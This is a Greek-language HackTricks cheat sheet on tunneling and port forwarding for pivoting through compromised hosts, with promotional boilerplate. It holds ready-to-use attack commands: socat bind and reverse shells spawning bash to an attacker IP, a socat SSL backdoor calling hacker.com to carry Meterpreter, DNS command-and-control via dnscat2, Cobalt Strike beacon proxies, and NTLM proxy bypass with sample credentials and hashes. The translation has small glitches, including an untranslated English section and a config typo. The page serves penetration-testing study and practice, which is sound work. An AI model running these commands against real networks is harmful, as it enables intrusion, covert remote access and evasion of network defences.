# Σήραγγες και Προώθηση Θύρας

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου HackTricks AWS)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Συμβουλή Nmap

{% hint style="warning" %}
Οι σάρωσεις **ICMP** και **SYN** δεν μπορούν να τουνελιστούν μέσω socks proxies, οπότε πρέπει να **απενεργοποιήσουμε την ανακάλυψη ping** (`-Pn`) και να καθορίσουμε **σάρωσεις TCP** (`-sT`) για να λειτουργήσει αυτό.
{% endhint %}

## **Bash**

**Κεντρικός Υπολογιστής -> Άλμα -> ΕσωτερικόA -> ΕσωτερικόB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Γραφική σύνδεση SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Τοπική Πύλη προς Πύλη

Ανοίξτε νέα πύλη στον διακομιστή SSH --> Άλλη πύλη
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Θύρα προς Θύρα

Τοπική θύρα --> Χειρισμένος κόμβος (SSH) --> Τρίτος_κόμβος:Θύρα
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Τοπική Θύρα --> Χειραγωγημένος κόμβος (SSH) --> Όπουδήποτε
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Αντίστροφη Προώθηση Θύρας

Αυτό είναι χρήσιμο για να λάβετε αντίστροφα κελύφη από εσωτερικούς υπολογιστές μέσω μιας ζώνης ασφαλείας (DMZ) προς τον υπολογιστή σας:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Χρειάζεστε **root σε και τις δύο συσκευές** (καθώς θα δημιουργήσετε νέες διεπαφές) και η διαμόρφωση του sshd πρέπει να επιτρέπει τη σύνδεση ως root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Ενεργοποίηση της προώθησης στην πλευρά του Διακομιστή
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ορίστε μια νέα διαδρομή στην πλευρά του πελάτη
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Μπορείτε να **σήραγγα** μέσω **ssh** ολη τη **κίνηση** προς ένα **υποδίκτυο** μέσω ενός κεντρικού υπολογιστή.\
Για παράδειγμα, προώθηση ολη τη κίνηση που πηγαίνει στο 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Σύνδεση με έναν ιδιωτικό κλειδί
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Τοπική θύρα --> Χειρισμένος υπολογιστής (ενεργή συνεδρία) --> Τρίτος_υπολογιστής:Θύρα
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS (Socket Secure) είναι ένα πρωτόκολλο προϋποθέσεων που επιτρέπει τη δρομολόγηση της κίνησης δικτύου μεταξύ δύο συσκευών μέσω ένος ενδιάμεσου διακομιστή.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
### Tunneling and Port Forwarding

#### Tunneling

Tunneling is a method that allows data to be transferred securely over a public network. It works by encapsulating the data in another protocol, creating a secure "tunnel" through which the data can travel. This is commonly used to bypass firewalls and access restricted networks.

There are several tools available for creating tunnels, such as SSH, VPNs, and proxy servers. These tools can be used to establish secure connections between a client and a server, allowing data to be transmitted safely.

#### Port Forwarding

Port forwarding is a technique used to redirect computer signals (ports) between local and remote machines. It can be used to bypass firewalls, access remote services, and establish secure connections between machines.

Port forwarding works by mapping a port on the local machine to a port on the remote machine, allowing traffic to be redirected between the two. This can be useful for accessing services on a remote machine that are not directly accessible from the internet.
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Ανοίξτε ένα θύρα στο teamserver που ακούει σε όλα τα δίκτυα που μπορούν να χρησιμοποιηθούν για **δρομολόγηση της κίνησης μέσω του beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
Σε αυτήν την περίπτωση, η **θύρα ανοίγεται στον φιλοξενούμενο κόμβο**, όχι στον Διακομιστή Ομάδας και η κίνηση στέλνεται στον Διακομιστή Ομάδας και από εκεί στον καθορισμένο κόμβο:θύρα
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
### rPort2Port τοπικό

{% hint style="warning" %}
Σε αυτήν την περίπτωση, η **θύρα ανοίγεται στον υπολογιστή του beacon**, όχι στον Team Server και η **κίνηση στέλνεται στον πελάτη του Cobalt Strike** (όχι στον Team Server) και από εκεί στον καθορισμένο κεντρικό υπολογιστή:θύρα
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Χρειάζεστε να μεταφορτώσετε ένα αρχείο τούνελ ιστού: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Μπορείτε να το κατεβάσετε από τη σελίδα κυκλοφορίας του [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Πρέπει να χρησιμοποιήσετε **την ίδια έκδοση για τον πελάτη και τον διακομιστή**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Προώθηση θυρών
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Αντίστροφος τούνελ. Το τούνελ ξεκινά από το θύμα.\
Δημιουργείται ένας proxy socks4 στη διεύθυνση 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Κατευθυνθείτε μέσω **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Αντίστροφη κέλυφος
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Θύρα προς Θύρα
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Θύρα προς Θύρα μέσω socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter μέσω SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Μπορείτε να παρακάμψετε ένα **μη εξουσιοδοτημένο διακομιστή proxy** εκτελώντας αυτήν τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Σήραγγα SSL Socat

**/bin/sh κονσόλα**

Δημιουργήστε πιστοποιητικά σε και τις δύο πλευρές: Πελάτη και Διακομιστή
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Απομακρυσμένη Μετάδοση Θύρας προς Θύρα

Συνδέστε την τοπική θύρα SSH (22) με τη θύρα 443 του υπολογιστή του εισβολέα
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Είναι σαν μια έκδοση κονσόλας του PuTTY (οι επιλογές είναι πολύ παρόμοιες με έναν πελάτη ssh).

Καθώς αυτό το δυαδικό αρχείο θα εκτελεστεί στο θύμα και είναι ένας πελάτης ssh, πρέπει να ανοίξουμε την υπηρεσία ssh και τη θύρα μας ώστε να έχουμε μια αντίστροφη σύνδεση. Στη συνέχεια, για να προωθήσουμε μόνο την τοπικά προσβάσιμη θύρα σε μια θύρα στον υπολογιστή μας:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Θύρα προς Θύρα

Χρειάζεστε να είστε τοπικός διαχειριστής (για οποιαδήποτε θύρα)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Χρειάζεστε **πρόσβαση RDP στο σύστημα**.\
Λήψη:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί `Δυναμικά Εικονικά Κανάλια` (`DVC`) από το χαρακτηριστικό Υπηρεσίας Απομακρυσμένης Επιφάνειας Εργασίας των Windows. Το DVC είναι υπεύθυνο για το **σήραγγαγή πακέτων μέσω της σύνδεσης RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Στον υπολογιστή του πελάτη φορτώστε το **`SocksOverRDP-Plugin.dll`** όπως παρακάτω:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Τώρα μπορούμε **να συνδεθούμε** στον **θύμα** μέσω **RDP** χρησιμοποιώντας το **`mstsc.exe`**, και θα πρέπει να λάβουμε μια **προτροπή** που λέει ότι το πρόσθετο **SocksOverRDP είναι ενεργοποιημένο**, και θα **ακούει** στη διεύθυνση **127.0.0.1:1080**.

**Συνδεθείτε** μέσω **RDP** και μεταφορτώστε & εκτελέστε στο μηχάνημα του θύματος το δυαδικό `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Τώρα, επιβεβαιώστε στον υπολογιστή σας (επιτιθέμενος) ότι η θύρα 1080 ακούει:
```
netstat -antb | findstr 1080
```
Τώρα μπορείτε να χρησιμοποιήσετε το [**Proxifier**](https://www.proxifier.com/) **για να προωθήσετε την κίνηση μέσω αυτής της θύρας.**

## Προώθηση εφαρμογών Windows GUI με το Proxifier

Μπορείτε να κάνετε τις εφαρμογές Windows GUI να πλοηγούνται μέσω ενός διακομιστή proxy χρησιμοποιώντας το [**Proxifier**](https://www.proxifier.com/).\
Στο **Profile -> Proxy Servers** προσθέστε την IP και τη θύρα του διακομιστή SOCKS.\
Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να προωθήσετε και τις συνδέσεις στις IP που θέλετε να προωθήσετε.

## Παράκαμψη NTLM proxy

Το προηγουμένως αναφερθέν εργαλείο: **Rpivot**\
**OpenVPN** μπορεί επίσης να το παρακάμψει, ρυθμίζοντας αυτές τις επιλογές στο αρχείο ρυθμίσεων:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Αυτοπιστοποιείται ενάντια σε έναν διαμεσολαβητή και δένει έναν τοπικό θύρα που προωθείται προς την εξωτερική υπηρεσία που καθορίζετε. Έπειτα, μπορείτε να χρησιμοποιήσετε το εργαλείο της επιλογής σας μέσω αυτής της θύρας.\
Για παράδειγμα, αυτό προωθεί τη θύρα 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Τώρα, αν ρυθμίσετε για παράδειγμα στο θύμα την υπηρεσία **SSH** να ακούει στη θύρα 443. Μπορείτε να συνδεθείτε σε αυτή μέσω της θύρας 2222 του επιτιθέμενου.\
Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στη θύρα 2222.

## YARP

Ένας αντίστροφος διακομιστής που δημιουργήθηκε από τη Microsoft. Μπορείτε να το βρείτε εδώ: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Απαιτείται δικαιώματα ρίζας σε και τα δύο συστήματα για τη δημιουργία προσαρμογέων tun και τη διέλευση δεδομένων μεταξύ τους χρησιμοποιώντας ερωτήματα DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Ο τούνελ θα είναι πολύ αργό. Μπορείτε να δημιουργήσετε μια συμπιεσμένη σύνδεση SSH μέσω αυτού του τούνελ χρησιμοποιώντας:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Κατεβάστε το από εδώ**](https://github.com/iagox86/dnscat2)**.**

Καθιερώνει ένα κανάλι C\&C μέσω DNS. Δεν απαιτεί δικαιώματα ρίζας.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Στο PowerShell**

Μπορείτε να χρησιμοποιήσετε το [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) για να εκτελέσετε έναν πελάτη dnscat2 στο powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Προώθηση θύρας με το dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Αλλαγή DNS του proxychains

Το Proxychains παρεμβαίνει στην κλήση `gethostbyname` της βιβλιοθήκης libc και δρομολογεί το αίτημα DNS tcp μέσω του socks proxy. Από προεπιλογή, ο **DNS** server που χρησιμοποιεί το proxychains είναι το **4.2.2.2** (προκαθορισμένο). Για να το αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε τη διεύθυνση IP. Αν βρίσκεστε σε ένα περιβάλλον **Windows**, μπορείτε να ορίσετε την IP του **domain controller**.

## Tunnels σε Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Χρειάζεται δικαιώματα διαχειριστή (root) σε και τα δύο συστήματα για να δημιουργήσετε τα τουν αντάπτορες και να δρομολογήσετε δεδομένα μεταξύ τους χρησιμοποιώντας ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Κατεβάστε το από εδώ**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) είναι ένα εργαλείο για την εκθεση λύσεων στο Internet με μία εντολή γραμμής.**
*Οι διευθύνσεις URI εκθεσης είναι όπως:* **UID.ngrok.io**

### Εγκατάσταση

- Δημιουργία λογαριασμού: https://ngrok.com/signup
- Λήψη πελάτη:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Βασικές χρήσεις

**Τεκμηρίωση:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Είναι επίσης δυνατή η προσθήκη πιστοποίησης και TLS, αν είναι απαραίτητο.*

#### Σήραγγα TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Αποκάλυψη αρχείων με HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Καταγραφή κλήσεων HTTP

*Χρήσιμο για XSS, SSRF, SSTI ...*
Απευθείας από το stdout ή στη διεπαφή HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Σήραγγα εσωτερικού υπηρεσίας HTTP
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Απλό παράδειγμα διαμόρφωσης του αρχείου ngrok.yaml

Ανοίγει 3 τούνελ:
- 2 TCP
- 1 HTTP με εκθεση στατικών αρχείων από το /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Άλλα εργαλεία για έλεγχο

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks**; ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή την [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
